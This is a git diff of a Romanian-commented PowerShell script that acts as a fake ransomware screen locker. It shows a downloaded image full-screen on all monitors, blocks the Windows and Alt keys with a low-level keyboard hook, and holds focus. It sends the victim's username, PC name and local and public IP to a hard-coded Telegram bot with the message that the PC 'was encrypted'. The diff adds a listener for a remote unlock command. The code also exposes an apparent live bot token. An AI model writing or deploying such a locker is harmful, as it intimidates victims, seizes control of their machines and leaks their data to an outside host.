@@ -1,31 +1,53 @@
-# URL-ul imaginii
+# ▶️ Setări
 $imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
 $tempImagePath = "$env:TEMP\image.jpg"
+$botToken = "7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co"
+$chatID = "656189986"
+$pc = $env:COMPUTERNAME
+$user = $env:USERNAME
+$unlockCommand = "/unlock$user"
 
-# Trimite mesaj pe Telegram
+# ▶️ Trimite mesaj pe Telegram
 function Send-Telegram-Message {
-    $pc = $env:COMPUTERNAME
-    $user = $env:USERNAME
-
-    $ipLocal = (Get-NetIPAddress -AddressFamily IPv4 |
-        Where-Object { $_.IPAddress -notmatch '^127|169\.254|^0\.|^255|^fe80' -and $_.PrefixOrigin -ne "WellKnown" })[0].IPAddress
-
     try {
-        $ipPublic = (Invoke-RestMethod -Uri "https://api.ipify.org") -as [string]
-    } catch {
-        $ipPublic = "n/a"
-    }
+        $ipLocal = (Get-NetIPAddress -AddressFamily IPv4 |
+            Where-Object { $_.IPAddress -notmatch '^127|169\.254|^0\.|^255|^fe80' -and $_.PrefixOrigin -ne "WellKnown" })[0].IPAddress
+    } catch { $ipLocal = "n/a" }
 
-    $message = "PC-ul $user ($pc) a fost criptat cu succes.`nIP: $ipLocal | $ipPublic"
-    $uri = 'https://api.telegram.org/bot7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co/sendMessage'
-    $body = @{ chat_id = '656189986'; text = $message } | ConvertTo-Json -Compress
+    try { $ipPublic = (Invoke-RestMethod -Uri "https://api.ipify.org") -as [string] } catch { $ipPublic = "n/a" }
+
+    $message = "PC-ul $user ($pc) a fost criptat cu succes.`nIP: $ipLocal | $ipPublic`n`nUnlock it: $unlockCommand"
+    $body = @{ chat_id = $chatID; text = $message } | ConvertTo-Json -Compress
+    $uri = "https://api.telegram.org/bot$botToken/sendMessage"
 
     try {
         Invoke-RestMethod -Uri $uri -Method POST -Body $body -ContentType 'application/json'
     } catch {}
 }
 
-# Descărcare imagine
+# ▶️ Monitorizează Telegram pentru /unlock
+function Start-Telegram-Listener {
+    $uriGet = "https://api.telegram.org/bot$botToken/getUpdates"
+    $lastUpdateId = 0
+
+    while ($true) {
+        try {
+            $response = Invoke-RestMethod -Uri $uriGet -TimeoutSec 5
+            foreach ($update in $response.result) {
+                if ($update.update_id -gt $lastUpdateId) {
+                    $lastUpdateId = $update.update_id
+                    $txt = $update.message.text
+                    if ($txt -eq $unlockCommand) {
+                        [System.Windows.Forms.Application]::Exit()
+                    }
+                }
+            }
+        } catch {}
+        Start-Sleep -Seconds 3
+    }
+}
+
+# ▶️ Descărcare imagine
 function Download-Image {
     try {
         Invoke-WebRequest -Uri $imageURL -OutFile $tempImagePath -ErrorAction Stop
@@ -35,7 +57,7 @@ function Download-Image {
     }
 }
 
-# Blocare taste: Windows + Alt + C pt închidere
+# ▶️ Blocare taste
 function Block-And-MonitorKeys {
     Add-Type @"
         using System;
@@ -45,7 +67,6 @@ function Block-And-MonitorKeys {
             private static IntPtr hookId = IntPtr.Zero;
 
             private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
-
             private static LowLevelKeyboardProc proc = HookCallback;
 
             private const int WH_KEYBOARD_LL = 13;
@@ -53,22 +74,15 @@ function Block-And-MonitorKeys {
 
             [DllImport("user32.dll")]
             private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
-
             [DllImport("user32.dll")]
             private static extern bool UnhookWindowsHookEx(IntPtr hhk);
-
             [DllImport("user32.dll")]
             private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
-
             [DllImport("kernel32.dll")]
             private static extern IntPtr GetModuleHandle(string lpModuleName);
 
             public static void BlockAndMonitor() {
                 hookId = SetHook(proc);
-            }
-
-            public static void Unblock() {
-                UnhookWindowsHookEx(hookId);
             }
 
             private static IntPtr SetHook(LowLevelKeyboardProc proc) {
@@ -82,20 +96,16 @@ function Block-And-MonitorKeys {
                 if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
                     int vkCode = Marshal.ReadInt32(lParam);
 
-                    // Tasta C = Închidere
+                    // C = închidere
                     if (vkCode == 0x43) {
                         Environment.Exit(0);
                     }
 
-                    // Tasta Windows (stg/dreapta)
-                    if (vkCode == 0x5B || vkCode == 0x5C) {
-                        return (IntPtr)1;
-                    }
+                    // Windows Left / Right
+                    if (vkCode == 0x5B || vkCode == 0x5C) return (IntPtr)1;
 
-                    // Tasta Alt
-                    if (vkCode == 0x12) {
-                        return (IntPtr)1;
-                    }
+                    // Alt
+                    if (vkCode == 0x12) return (IntPtr)1;
                 }
                 return CallNextHookEx(hookId, nCode, wParam, lParam);
             }
@@ -104,7 +114,7 @@ function Block-And-MonitorKeys {
     [KeyboardMonitor]::BlockAndMonitor()
 }
 
-# Afișare imagine pe toate monitoarele + workaround Alt
+# ▶️ Afișează imaginea pe toate monitoarele + blocări focus
 function Show-FullScreenImage {
     Add-Type -AssemblyName System.Windows.Forms
     Add-Type -AssemblyName System.Drawing
@@ -124,36 +134,32 @@ function Show-FullScreenImage {
         $form.KeyPreview = $true
         $form.Cursor = [System.Windows.Forms.Cursors]::None
 
-        # 🛡 Workaround blocare ALT (recaptură focus + ignoră tasta)
+        # 🛡 Blocare ALT & menținere focus
         $form.Add_Deactivate({ $form.Focus() })
-        $form.Add_KeyDown({
-            if ($_.Alt) { $_.Handled = $true }
-        })
+        $form.Add_KeyDown({ if ($_.Alt) { $_.Handled = $true } })
 
         try {
             $img = [System.Drawing.Image]::FromFile($tempImagePath)
         } catch {
-            Write-Host "Eroare la încărcarea imaginii." -ForegroundColor Red
             exit
         }
 
-        $pictureBox = New-Object System.Windows.Forms.PictureBox
-        $pictureBox.Image = $img
-        $pictureBox.Dock = 'Fill'
-        $pictureBox.SizeMode = 'StretchImage'
-        $form.Controls.Add($pictureBox)
+        $pb = New-Object Windows.Forms.PictureBox
+        $pb.Image = $img
+        $pb.Dock = 'Fill'
+        $pb.SizeMode = 'StretchImage'
+        $form.Controls.Add($pb)
 
         $forms += $form
     }
 
-    foreach ($form in $forms) {
-        [void]$form.Show()
-    }
+    foreach ($f in $forms) { $f.Show() }
 
+    Start-Job { Start-Telegram-Listener }
     [System.Windows.Forms.Application]::Run()
 }
 
-# EXECUȚIE
+# ▶️ Rulare
 Download-Image
 Send-Telegram-Message
 Block-And-MonitorKeys
